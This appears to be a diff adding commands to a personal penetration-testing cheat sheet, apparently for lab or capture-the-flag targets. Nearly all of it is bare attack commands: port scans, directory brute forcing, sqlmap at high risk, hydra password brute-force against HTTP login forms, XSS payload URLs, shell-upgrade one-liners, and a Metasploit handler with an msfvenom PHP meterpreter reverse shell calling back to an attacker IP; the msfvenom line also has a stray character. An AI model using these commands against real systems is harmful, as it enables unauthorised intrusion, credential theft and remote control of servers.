@@ -233,3 +233,56 @@ Traffic forward over SSH without needing to ```ssh -D <port>```
 <pre>sshuttle -vr user@192.168.207.57 180.46.0.0/16</pre>
 
 ![shuttle2](https://user-images.githubusercontent.com/7115563/34785498-a0b5c8c0-f631-11e7-8f3d-75e0ade96275.png) Proof: ![mantis2](https://user-images.githubusercontent.com/7115563/34785499-a0e7d838-f631-11e7-869f-d6fcdc1051e9.png) Reference: http://teohm.com/blog/using-sshuttle-in-daily-work/</port></user></ip></ip></ip></ip></ip></ip></ip></ip></port></ip>
+
+Download from apache directory list
+wget -m -np http://eamos.pf.jcu.cz/amos/kat_inf/externi/
+
+$ nmap -p- -oA nmap.tcp 192.168.66.129
+$ nmap -sU -p- -oA nmap.udp 192.168.66.129
+
+$ ./dirsearch.py -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20 -e php -u 192.168.66.129
+
+$ python -c `import pty; pty.spawn("/bin/sh")`
+$ stty raw -echo
+
+LinEnum.sh
+linuxprivchecker.py
+unixprivesc.sh
+
+
+  ./dirsearch.py -u http://88.198.233.174:42272 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e php -f -r
+
+  sqlmap -r /tmp/req.txt -v -a --level 4 --risk 3
+
+hydra 88.198.233.174 -s 42159 http-form-post "/index.php:password=^PASS^:Invalid password!" -l '' -P /usr/share/wordlists/seclists/Passwords/rockyou-75.txt -t 10 -w 30 -o hydra-http-post-attack.txt
+
+nmap -sS -A -PN -p- --script=http-title dontscanme.bro
+
+hydra 88.198.233.174 -s 42181 http-form-post "/main/index.php:name1=^USER^&name2=^PASS^:Wrong Credentials baby!" -L /usr/share/wordlists/seclists/Usernames/Names/names.txt -P /usr/share/wordlists/seclists/Passwords/rockyou-75.txt -t 10 -w 30 -o /tmp/hydra-http-post-attack.txt
+
+
+http://185.45.192.228/xssChall/1.php?xss=%27;alert(String.fromCharCode(88,83,83))//%27;alert(String.fromCharCode(88,83,83))//%22;alert(String.fromCharCode(88,83,83))//%22;alert(String.fromCharCode(88,83,83))//--%3E%3C/SCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert(String.fromCharCode(88,83,83))%3C/SCRIPT%3E
+http://185.45.192.228/xssChall/2.php?xss=images.jpeg%27onmouseover=%22alert(%27xxs%27)%22
+http://185.45.192.228/xssChall/3.php?xss=<script>window.onload=function(){eval(window.atob('ZXZhbChhbGVydCgxKSk7Cg=='))}</script>
+
+
+http://185.45.192.228/xssChall/5.php?xss=%22onmousemove=%22window[%27al\u0065rt%27](1337)%22
+
+http://185.45.192.228/xssChall/6.php?xss=%27%3Cscript%3Ewindow.onload=function(){window[%27al\u0065rt%27](1337)}%3C/script%3E
+
+
+gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.10.10.27 -x '.php' -e -t 25
+
+gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.10.10.27   -e -t 25
+
+
+use exploit/multi/handler
+set PAYLOAD  php/meterpreter/reverse_tcp
+set LHOST 10.10.17.29
+set LPORT 5555
+set ExitOnSession false
+exploit -j -z
+
+msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.17.29 LPORT=5555> -f raw > shell.php
+
+python -c 'import pty; pty.spawn("/bin/bash")'
